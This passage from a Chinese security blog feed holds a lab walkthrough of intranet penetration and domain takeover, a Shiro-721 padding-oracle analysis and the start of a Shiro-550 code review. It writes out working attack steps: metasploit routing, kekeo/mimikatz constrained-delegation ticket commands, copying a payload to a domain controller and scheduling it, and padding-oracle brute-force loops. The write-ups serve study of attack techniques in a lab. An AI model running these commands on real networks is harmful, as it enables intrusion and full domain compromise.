        <content type="html"><![CDATA[<p>这篇文章准备系统性的记录一下，从内网代理，隧道通信等原理，到靶机搭建，内网环境构筑，来实际感受下内网渗透</p><a id="more"></a><h1 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h1><p>代理</p><blockquote><p>代理的核心，是为了解决不出网问题，比如，A主机在外网，b主机在内网，这个时候，就是把A主机当成跳板去访问B主机<br>隧道<br>隧道的核心，是为了解决协议问题，比如禁用了http，或者tcp协议，这个时候，就要去考虑使用更低级的协议，比如icmp等等<br><img src="https://s2.loli.net/2023/01/16/8RdpZvUsIOJVtNA.png"></p></blockquote><p>而连接通信的基本方式分为两种</p><blockquote><p>正向🐎 bind<br>hacker直接去连接靶机<br>反向🐎 reverse_tcp<br>靶机反向来连接hacker</p></blockquote><h2 id="cs-amp-msf-socks代理使用"><a href="#cs-amp-msf-socks代理使用" class="headerlink" title="cs&amp;msf_socks代理使用"></a>cs&amp;msf_socks代理使用</h2><p>在CS中，是可以很方便的使用socks代理，这里因为版本是4.3，所以只有socks4a，在后续版本可以选择socks5等来通信<br><img src="https://s2.loli.net/2023/01/17/6bQBDaJU5pzCZm3.png"><br>接着会开放一个端口，我这里使用的是Proxifier来挂起代理<br>而使用msf可能会相对麻烦一点，毕竟CS是内网神器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">查看路由<br>arp -a<br>添加路由<br><span class="hljs-builtin-name">run</span> post/multi/manage/autoroute<br>查看路由<br><span class="hljs-builtin-name">run</span> autoroute -p<br>设置socks代理<br>use auxiliary/server/socks_proxy<br><span class="hljs-builtin-name">set</span> srvhost 0.0.0.0<br><span class="hljs-builtin-name">set</span> srvport 1115<br>run<br></code></pre></td></tr></table></figure><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><blockquote><p>kali linux (网卡为桥接)<br>windows server2012 R2(外网机器，两张网卡，一个是桥接，一个是vm2)<br>windows 7 x 64 (两张网卡，一个是vm2，一个是vm4[这个vm4是网段是10.10.10.0<br>255.255.255.255])<br>windows Server 2008 R2 x64(sql服务器 网卡为vm4)<br>windows Server 2008 R2 x64(DC 域控+owa  网卡为vm4)</p></blockquote><p>这里放一张图，就能很好的理解整个内网框架了<br><img src="https://s2.loli.net/2023/01/17/gwhdm8Pyf7TWRDt.png"></p><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>渗透的本质是信息收集，所以我们先开始第一步，在kali的同网段下开始扫描存活主机</p><h2 id="攻陷WEB服务器"><a href="#攻陷WEB服务器" class="headerlink" title="攻陷WEB服务器"></a>攻陷WEB服务器</h2><p>可以看到，我们这里扫到了一个weblogic的主机<br><img src="https://s2.loli.net/2023/01/17/RVSzmk4J8ZhKci2.png"><br>我们也肯容易知道，weblogic是在7001端口下的，那我们试着访问一下<br><img src="https://s2.loli.net/2023/01/17/VlOCNosB3ZLnz9p.png"><br>发现成功访问了，说明这台主机是正常开启了weblogic服务的<br>weblogic的历史反序列化漏洞太多了，我们可以直接先用自动化工具测试一下，看看是否存在已有的漏洞，可以直接利用<br><img src="https://s2.loli.net/2023/01/17/U8QxS2kKetfCTHr.png"><br>可以看到，我们经过每个漏洞的测试，可以判断其存在CVE-2017-10271 Weblogic12 XMLDecoder反序列化漏洞<br>然后尝试执行命令<br><img src="https://s2.loli.net/2023/01/17/58X3pzq9FY7NJOh.png"><br>也可以正常回显，那我们接着就上传文件<br>这里我使用的是哥斯拉，因为它文件上传是jsp文件，第一时间就想到哥斯拉了<br>设置好哥斯拉的码<br><img src="https://s2.loli.net/2023/01/17/4yx5IZJuUaDizqd.png"><br>然后把哥斯拉的码内容替换，传上去<br><img src="https://s2.loli.net/2023/01/17/r7f9sq4tDHwT2jP.png"><br>得到上传的路径，接着访问一下，顺利连上哥斯拉<br><img src="https://s2.loli.net/2023/01/17/8CmBRaSfOqvopKd.png"><br>这样我们就拿到这台WEB服务器的shell了，但为了我们后续的内网渗透，横向移动，我们把他连到CS上面来<br>用CS生成个码，使用哥斯拉把他传上去，执行<br><img src="https://s2.loli.net/2023/01/17/WiSNBXMwRVoJqnA.png"><br>然后CS成功上线<br><img src="https://s2.loli.net/2023/01/17/Yemvlo1drQXWH7w.png"></p><h2 id="利用WEB服务器变成跳板"><a href="#利用WEB服务器变成跳板" class="headerlink" title="利用WEB服务器变成跳板"></a>利用WEB服务器变成跳板</h2><p>首先我们看一下这台WEB服务器的网络信息，接入了哪些局域网<br><img src="https://s2.loli.net/2023/01/17/ujdiSrHnFohI73y.png"><br>很明显，这个<code>10.10.20.12</code>就是这个WEB服务器所连接的内网了<br>我们先利用这台WEB服务器，对<code>10.10.20.0/24</code>所在网络进行扫描存活主机<br><img src="https://s2.loli.net/2023/01/17/mpG8thiLHjPckRY.png"><br>可以看到，我们该网段下，发现了另一台存活主机<code>10.10.20.7</code>，那么这台肯定就是内网的主机了<br><img src="https://s2.loli.net/2023/01/17/xBVqlaNILzu4XZD.png"><br>同时在target里面，也会记录下我们所扫描的同网段下的存活主机<br>现在我们需要做的就是，如何利用这台WEB服务器当作跳板进行通信，来将这台内网主机的权限拿到手<br>在这里推荐一个工具，<code>fscan32</code>，它的体积小，专门适用于传上跳板机，扫描内网<br>我们使用fscan32，直接对10.10.20.7该主机进行扫描<br><img src="https://s2.loli.net/2023/01/17/X7gJCyQaRn56bxT.png"><br>可以看到结果，很明显，其存在ms17_010可以直接利用，那我们就得上msf了<br>首先，得先把我们上线cs的这台WEB服务器，传给msf<br><img src="https://s2.loli.net/2023/01/17/tXasIGcJUOWT5n6.png"><br>设置好cs中的host与port，<code>spawn msf</code>(这里msf是cs中Listeners的名字)来传递给msf<br>同样，在msf中设置好对应的端口<br><img src="https://s2.loli.net/2023/01/17/gkDp39o6xrwzB5m.png"><br>随着msf与cs的通信成功，这样cs已经上线的WEB服务器，成功的交给了msf去进一步使用了<br><img src="https://s2.loli.net/2023/01/17/PoIlzFYDveGBMRH.png"><br>利用前面的，msf的socks使用，我们先建立路由<br><img src="https://s2.loli.net/2023/01/17/TCUKsqiZYN3avEQ.png"><br>建立好之后，接着就是用永恒之蓝ms17_010直接打<br><img src="https://s2.loli.net/2023/01/17/XWJr6lpPsg3Z1In.png"><br>成功拿下<br><img src="https://s2.loli.net/2023/01/17/Ei1xA2PwmrZJNFI.png"><br>接着我们需要再把这台主机，从msf上线到cs上<br>这里我选择的是正向连接，反向连接也是一样<br><img src="https://s2.loli.net/2023/01/17/wV74ZsCE5fKJRYn.png"><br>使用msf把cs生成的码传上去<br><img src="https://s2.loli.net/2023/01/17/ODmX3Aun67L2tfe.png"><br>传上去之后运行，并同时在cs中进行connect<br><img src="https://s2.loli.net/2023/01/17/ov5cXU2HwRD1MTf.png"><br>成功拿下其内网的第一台主机</p><h2 id="深入域中"><a href="#深入域中" class="headerlink" title="深入域中"></a>深入域中</h2><p>同理，我们拿到这台内网主机之后，先查看一下它的网络情况<br><img src="https://s2.loli.net/2023/01/17/oceHafEQWvKOjFA.png"><br>可以看到，<code>10.10.20.7</code>是与WEB服务器相连的，而<code>10.10.10.7</code>肯定就是其域内的网段了<br>我们可以先用cs非常方便的建立一个socks4a的通道<br><img src="https://s2.loli.net/2023/01/17/SNO4DUgz82PMHsy.png"><br>接着对<code>10.10.10.0/24</code>对存活主机进行扫描<br><img src="https://s2.loli.net/2023/01/17/MWs7Xq3ivKUe8Jm.png"><br>由扫描结果可以知道，在该域内，除了本主机，还存在另外两台存活主机<br>我们分别仔细地扫描一下看看结果<br>先看<code>10.10.10.8</code>这台主机<br><img src="https://s2.loli.net/2023/01/17/epNu8AXa2JUDS6M.png"><br>有扫描出来的信息可以看到，这台带概率就是域控了<br>但是域控没有扫描出什么结果，反而是另外一条sql的服务器直接爆出了用户名和口令<br><img src="https://s2.loli.net/2023/01/17/7JH4MUvmID3rVfG.png"><br>可以看到，其用户名与口令分别是<code>sa</code>、<code>sa</code><br>这里推荐一个工具<code>MDUT</code>，可以直接连接各种数据库，一键执行<br><img src="https://s2.loli.net/2023/01/17/XVb27M1CYlv5t3W.png"><br>成功连上之后，测试一下，可以正常执行命令<br><img src="https://s2.loli.net/2023/01/17/9Wvg46CIDsxewYR.png"><br>那我们接着就上传文件，还是跟之前一样，用cs生成个码传上去就好了<br><img src="https://s2.loli.net/2023/01/17/UIyFXvpsexAaMzo.png"></p><h2 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h2><p>我们现在拿下了域内的一台个人主机，一台sql服务器，接下来就是最后一台域控了<br>现在的拿下的主机，有一台颜色不太统一，我们先给他提个权<br><img src="https://s2.loli.net/2023/01/17/m69DgTJWbeLfNiK.png"><br>好了，舒服了，现在全力拿下域控<br>但这里提到一个知识点</p><blockquote><p>#委派攻击分类：（委派继承，转递）域委派是指将域内用户的权限委派给服务账户<br>1、非约束性委派 (没有限制性的)<br>2、约束性委派（有限制性的）<br>3、基于资源的约束性委派（单方面，资源上面的约束）<br>这个需要查看是在那个机器上面设置了这个<br>约束性委派<br>user访问service1，向DC发起kerberos认证，域控返回user的TGT和ST1票据，user使用ST1票据对service1进行访问；如果配置了service1到service2的约束委派，则service1能使用S4U2Proxy协议将用户发给自己的可转发的ST1票据以用户的身份发给DC；DC返回service1一个用来访问service2的ST2票据,这样service1就能以用户的身份对service2发起访问。<br>1、机器设置仅信任此计算机指定服务-cifs<br>2、用户设置仅信任此计算机指定服务-cifs</p></blockquote><p>这里我们先用<code>AdFind</code>来查找存在的机器</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">查找域内约束委派用户和计算机：<br>AdFind.<span class="hljs-keyword">exe</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.8</span> -<span class="hljs-keyword">u</span> sqlserver -<span class="hljs-keyword">up</span> Server12345 -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=redteam,DC=red&quot;</span> -<span class="hljs-keyword">f</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-keyword">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/TwuEPAGfpY7QDLb.png"><br>接着去请求获取票据</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">-</span>攻击域内域控主机 <span class="hljs-selector-tag">-</span> 约束委派<br>1、<span class="hljs-selector-tag">kekeo</span>请求获取<span class="hljs-selector-tag">sqlserver</span>的<span class="hljs-selector-tag">TGT</span>：<span class="hljs-selector-tag">kekeo</span> &quot;<span class="hljs-selector-tag">tgt</span><span class="hljs-selector-pseudo">::ask</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:sqlserver</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:redteam.red</span> /<span class="hljs-selector-tag">password</span><span class="hljs-selector-pseudo">:Server12345</span> /<span class="hljs-selector-tag">ticket</span><span class="hljs-selector-pseudo">:administrator.kirbi&quot;</span> &quot;<span class="hljs-selector-tag">exit</span>&quot;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/Qy2oqVZSubz5NA1.png"><br>接着就是使用票据</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">2</span>、使用票据请求域控：kekeo <span class="hljs-string">&quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><span class="hljs-number">3</span>、导入内存（导入失败的话，使用普通用户导入）：mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi<br><span class="hljs-number">4</span>、连接域控：dir <span class="hljs-string">\\owa.redteam.red\c$</span><br><span class="hljs-number">5</span>、copy <span class="hljs-number">57.exe</span> <span class="hljs-string">\\owa.redteam.red\c$</span>  <span class="hljs-comment">#拷贝执行文件到目标机器</span><br><span class="hljs-number">6</span>、at <span class="hljs-string">\\owa.redteam.red</span> <span class="hljs-number">22</span>:<span class="hljs-number">07</span> c:<span class="hljs-string">\57.exe</span>   <span class="hljs-comment">#添加计划任务  15:47是执行的时间</span><br>at命令适用于小于win2012的机器<br></code></pre></td></tr></table></figure><p>然后还是一样，用cs生成的码，通过sql服务器，copy到域控上<br><img src="https://s2.loli.net/2023/01/17/jHBUzYv1rSwAF2V.png"><br>但这里最开始一直传不上去，原因是票据是一直更新的，会过期<br>所以重新导入一个票据之后，再进行copy<br><img src="https://s2.loli.net/2023/01/17/2V3LQd5mcOnrZkT.png"><br>成功传上去了<br>接着就是给域控设置一个任务，使码到时间之后，自动执行<br>同样，这里也会有票据过期的问题，再重新加载一个就好了<br><img src="https://s2.loli.net/2023/01/17/lcIBH5Cgy4kjn7E.png"><br>最后，拿下域控<br><img src="https://s2.loli.net/2023/01/17/9dUBuvYMoa3X5Tn.png"><br>整个域控，sql服务器，内网个人主机，WEB服务器全部拿下！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro-721漏洞分析与复现</title>
      <link href="2023/01/05/Shiro-721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>2023/01/05/Shiro-721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>在上一篇文章中，我们分析了<a href="https://glacierrrr.online/2023/01/04/Shiro-550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">shiro 550</a>的反序列化漏洞的原理以及应用，这次分析另一个shiro的高危漏洞shiro 721</p><a id="more"></a><p>shiro 721与550区别较大的是，550因为密钥为固定常量，导致可以伪造各种信息，而721修复了这一点，却又出现了新的问题</p><p>在shiro 721中，RememberMe Cookie 默认通过AES-128-CBC加密，而这种加密模式容易受到长度扩展攻击(在这里具体为Padding Oracle Attack( Oracle 填充攻击 ))，攻击者可以使用有效的 RememberMe Cookie 作为Paddding Oracle Attack 的前缀，然后精心构造RememberMe Cookie 来实施反序列化攻击</p><ol><li>使用任意账户登陆目标网站，以获取一个合法的RememberMe Cookie</li><li>将获取的值作为POA的前缀</li><li>加密反序列化的payload来构造恶意RememberMe Cookie</li><li>将构造好的恶意数据填充到 RememberMe Cookie字段中并发送</li></ol><blockquote><p>影响版本 1.2.5 &lt;= Shiro &lt;= 1.4.1</p></blockquote><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先，我们先得明确一点，这个漏洞能够被利用的核心，就是利用Padding Oracle Attack，那就先来分析下填充攻击</p><h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><p>AES-128-CBC加密，很好理解，使用的是AES加密算法，128bit为一个分组，而CBC指的是利用CBC加密模式</p><h3 id="AES-128-CBC"><a href="#AES-128-CBC" class="headerlink" title="AES-128-CBC"></a>AES-128-CBC</h3><blockquote><p>CBC 加密模式：将明文切分成若干小段，然后每一段分别与上一段的密文进行异或运算，再与密钥进行加密，生成本段明文的密文，这段密文用于下一段明文的加密。第一段明文没有对应的密文，为了确保分组的唯一性，CBC加密模式使用了初始化向量（IV，Initialization Vector）。初始化向量是一个固定长度的随机数，该向量会作为密文第一个块，随密文一同传输，在CBC模式中，因为链接模式中的异或操作是等长操作，所以初始化向量（IV）的长度与分组大小相同，为16 Bytes（128 bits）<br>纯粹的文字还是比较抽象，这里放上一张CBC加密的流程图，就很好理解了<br><img src="https://s2.loli.net/2023/01/05/CfTSswDpdx8z7OF.png" alt="CBC加密"><br>首先把明文按照128bit为一组分组，再由初始化的向量IV与明文的第一组进行异或，加密，得到密文的第一组。再用刚得到的异地组密文与第二组明文异或，加密，得到密文的第二组依次往后</p></blockquote><p>这样就很好理解了，但我们也会发现一个问题，在给明文分组的时候，如果不是128bit的倍数，也就是最后一组不够128bit(16byte)的时候怎么办，例如：<br>0123456789ABCDEF FEDCBA9876543210<br>这一共是32byte，也就是256bit刚好可以分为两组<br>0123456789ABCDEF FEDCBA987654<br>这一共是28byte, 也就是224bit，第二组不满128bit<br>如果就这样进入CBC中加密，那么在异或这一步的时候，就会因为位数不同而无法进行下去，故当初的算法设计这就想到了，使用PKCS5进行长度填充，比如在第二个例子中，最后缺少4个byte，则填充4个0x04，若缺少15个byte，则填充15个0x0f</p><h3 id="填充Oracle攻击"><a href="#填充Oracle攻击" class="headerlink" title="填充Oracle攻击"></a>填充Oracle攻击</h3><blockquote><p>Padding Oracle填充攻击（Padding Oracle Attack）是比较早的一种漏洞利用方式了，早在2011年的Pwnie Rewards中被评为“最具有价值的服务器漏洞”。这个漏洞主要是由于设计使用的场景不当，导致可以利用密码算法通过“旁路攻击”被破解。值得强调的是，这个漏洞启示并不是对算法本身的破解，而是利用算法本身的某些padding特性以及系统中不必要的一些错误提示，进而分析出系统当前的漏洞利用路径。同时也需要强调下，这里的Oracle，其实与甲骨文公司关系并不大，这里的Oracle可以理解为“提示、暗示”的含义。<br>既然是服务器漏洞，那么肯定会涉及到与服务器进行的交互，而这里就是用到服务器给出的回显或者相应的不同，来判断填充的是否正确，例如：<br>服务器返回200 -&gt; 密文与填充均正确<br>服务器返回301 -&gt; 密文正确，填充错误<br>服务器返回500 -&gt; 密文与填充均错误<br>这里根据服务器的相应变化，穷举填充的值，其实很类似于<strong>SQL中的盲注</strong><br>我们再来具体看CBC的解密流程<br><img src="https://s2.loli.net/2023/01/05/uwtMmj2U9BJhczi.png" alt="CBC解密"><br>解密时，与加密一样，先将密文按128bit分组，然后将第一组密文与密钥进行解密，再与初始向量IV异或，得到第一组明文，第二组密文与密钥进行解密，再与第一组密文异或，得到第二组密文，以此进行解密<br>因为Oracle的任务是提交数据让服务器解密，并验证解密后明文分组是否正确，所以我们不需要去解密明文，那我们只需要去遍历输入的值，根据服务器的返回信息，来判断正确，知道我们找到正确的值，也就这个padding符合规范</p></blockquote><p><img src="https://s2.loli.net/2023/01/05/jR6mXN7VaepQ5HS.png" alt="CBC解密"></p><ol><li>对于r的破解<br>根据CBC解密的流程，从最后一个分组入手，穷举猜测r使其满足CBC最后一个或者多个分组的输出填充规则，例如最后一个字节满足<img src="https://s2.loli.net/2023/01/05/ZS4HIyfvM21Vhdk.png" alt="注意，y的真实填充可能并非为0x01"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br><br>        c2=c2[:<span class="hljs-number">30</span>]+i+_<br>        <span class="hljs-comment"># c1=c1[:30]+i+_</span><br>        <span class="hljs-comment"># iv=iv[:30]+i+_</span><br><br>        iv_c=iv+c1+c2+c3<br>        <span class="hljs-comment"># iv_c=iv+c1+c2</span><br>        <span class="hljs-comment"># iv_c=iv+c1</span><br><br>        output = subp.call([<span class="hljs-string">&#x27;./dec_oracle.exe&#x27;</span>,iv_c])<br>        <span class="hljs-keyword">if</span> output==<span class="hljs-number">200</span>:<br>            print(i+_,<span class="hljs-string">&#x27;`````````````````````````&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li>进一步判断填充的长度<br>接下来就是进一步判断填充的长度，从r1入手，逐个字修改与确认<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2</span>):<br>     r=r1[:i]+<span class="hljs-string">&#x27;00&#x27;</span>+r1[i+<span class="hljs-number">2</span>:]<br><br>     iv_c_new=iv+c1+r+c3<br>     <span class="hljs-comment"># iv_c_new=iv+r+c2</span><br>     <span class="hljs-comment">#iv_c_new=r+c1</span><br>     output = subp.call([<span class="hljs-string">&#x27;./dec_oracle.exe&#x27;</span>,iv_c_new])<br>     <span class="hljs-keyword">if</span> output==<span class="hljs-number">500</span>:<br>         <span class="hljs-built_in">len</span>=<span class="hljs-number">16</span>-i/<span class="hljs-number">2</span>  <br>         print(<span class="hljs-built_in">len</span>) <span class="hljs-comment">#填充长度len=1,第二组填充长度len=1,第三组填充长度len=1</span><br><br>print(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x01</span>^<span class="hljs-number">0x3d</span>))<br></code></pre></td></tr></table></figure></li><li>进一步得到aj-1<br>通过调整r，将CBC解密后的填充修改为长度为b-j+2的形式，即让aj-1对应的字节也成为填充<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>            r1=r1[:<span class="hljs-number">30</span>-n*<span class="hljs-number">2</span>]+i+_+r1[<span class="hljs-number">32</span>-n*<span class="hljs-number">2</span>:]<br>            <br>             iv_c_new=iv+c1+r1+c3<br>            <span class="hljs-comment"># iv_c_new=iv+r1+c2</span><br>            <span class="hljs-comment"># iv_c_new=r1+c1</span><br>            <br>            output = subp.call([<span class="hljs-string">&#x27;./dec_oracle.exe&#x27;</span>,iv_c_new])<br>            <span class="hljs-keyword">if</span> output==<span class="hljs-number">200</span>:<br>                print(i+_,<span class="hljs-string">&#x27;``````````````````````````````````succeed!````````````````````````````````````&#x27;</span>)<br>                num=(<span class="hljs-built_in">int</span>(i+_,<span class="hljs-number">16</span>)^(n+<span class="hljs-number">1</span>))<br>                num=<span class="hljs-built_in">hex</span>(num)<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(num)&lt;<span class="hljs-number">4</span>):<br>                    num=<span class="hljs-string">&#x27;0x0&#x27;</span>+num[<span class="hljs-number">2</span>:]<br>                a.insert(<span class="hljs-number">0</span>,num[<span class="hljs-number">2</span>:])<br>                <span class="hljs-keyword">break</span><br>    r1=r1[:<span class="hljs-number">32</span>-(n+<span class="hljs-number">1</span>)*<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(a[q],<span class="hljs-number">16</span>)^(n+<span class="hljs-number">2</span>)))&lt;<span class="hljs-number">4</span>):<br>            r1+=<span class="hljs-string">&#x27;0&#x27;</span><br>        r1+=(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(a[q],<span class="hljs-number">16</span>)^(n+<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:])<br></code></pre></td></tr></table></figure></li><li>得到其他分组<br>利用上述方法可以恢复任意一个分组，的解密中间状态<br><img src="https://s2.loli.net/2023/01/05/cmxurhqOsZ1g8FH.png"><br>此时再根据截获的上一个分组密文y’，来获得真实的明文<br><img src="https://s2.loli.net/2023/01/05/6at1PIJKshNmwEq.png"></li></ol><p>在不知道密钥的情况下，完成数据的加密，绕过服务端的校验（解密成功+明文有效），达到攻击的目的，这就是填充Oracle攻击</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>可以下载<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">p神的环境</a><br>换一下pom.xml中shiro的版本即可<br>然后有exp也可以直接使用<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">exp</a><br>我这里还是为了省事，直接用vulhub搭建的<br><img src="https://s2.loli.net/2023/01/05/FMy56qkQ8Iws4la.png"><br>然后还是工具一把梭<br><img src="https://s2.loli.net/2023/01/05/aOqyfvmG4YFTESw.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro-550漏洞分析与复现</title>
      <link href="2023/01/04/Shiro-550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>2023/01/04/Shiro-550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><blockquote><p>影响版本 Shiro &lt;= 1.2.4</p></blockquote><a id="more"></a><p>当后端接收到来自未经身份验证的用户的请求时，处理Cookie的流程是</p><ol><li>检索cookie中RememberMe的值</li><li>Base64解码</li><li>使用AES解密</li><li>反序列化</li></ol><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ul><li>shiro: <a href="https://github.com/apache/shiro/tree/shiro-root-1.2.4">shiro-root-1.2.4</a></li><li>server: <a href="https://tomcat.apache.org/download-80.cgi">tomcat 8.5.75</a></li></ul><p>或者使用<a href="https://vulhub.org/">vulhub</a>来更方便的搭建整个靶场环境<br>首先我们先来分析下shiro的源码<br>先down下来，在IJ里面打开，然后静静地等它下载</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先，我们先明确流程与对线，主要是研究在RememberMe之后的登录过程</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>在打开RememberMe之后，其下一步就是加密，那我们先找到RememberMe这个地方</p><blockquote><p>core/src/main/java/org.apache.shiro/mgt/AbstractRememberMeManager<br>然后找到判断RememberMe和登录认证的函数</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onSuccessfulLogin</span><span class="hljs-params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>&#123;<br>    <span class="hljs-comment">//always clear any previous identity:</span><br>    forgetIdentity(subject);<br><br>    <span class="hljs-comment">//now save the new identity:</span><br>    <span class="hljs-keyword">if</span> (isRememberMe(token)) &#123;<br>        rememberIdentity(subject, token, info);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>            log.debug(<span class="hljs-string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +<br>                    <span class="hljs-string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);<br>        &#125;<br>    